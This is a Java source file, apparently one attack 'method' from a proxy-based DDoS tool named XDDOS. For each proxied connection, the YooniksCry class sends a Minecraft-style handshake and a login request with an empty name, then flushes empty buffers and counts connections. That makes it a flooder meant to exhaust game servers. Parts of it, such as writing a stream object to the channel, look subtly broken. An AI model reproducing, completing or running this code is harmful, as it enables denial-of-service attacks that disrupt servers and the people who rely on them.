package XD.XDDOS.methods;

import XD.XDDOS.Main;
import XD.XDDOS.NettyBootstrap;
import XD.XDDOS.ProxyLoader;
import XD.XDDOS.utils.Handshake;
import XD.XDDOS.utils.LoginRequest;
import io.netty.buffer.ByteBuf;
import io.netty.buffer.ByteBufOutputStream;
import io.netty.buffer.Unpooled;
import io.netty.channel.Channel;

public class YooniksCry implements Method {
  public static String bert = "";
  
  private Handshake handshake = new Handshake(Main.protcolID, Main.srvRecord, Main.port, 2);
  
  private byte[] bytes = this.handshake.getWrappedPacket();
  
  public void accept(Channel channel, ProxyLoader.Proxy proxy) {
    channel.writeAndFlush(Unpooled.buffer().writeBytes(this.handshake.getWrappedPacket()));
    ByteBuf b = Unpooled.buffer();
    ByteBufOutputStream bbbb = new ByteBufOutputStream(b);
    channel.writeAndFlush(Unpooled.buffer().writeBytes((new LoginRequest(bert)).getWrappedPacketC()));
    channel.writeAndFlush(b);
    channel.writeAndFlush(bbbb);
    NettyBootstrap.integer++;
    NettyBootstrap.totalConnections++;
  }
}
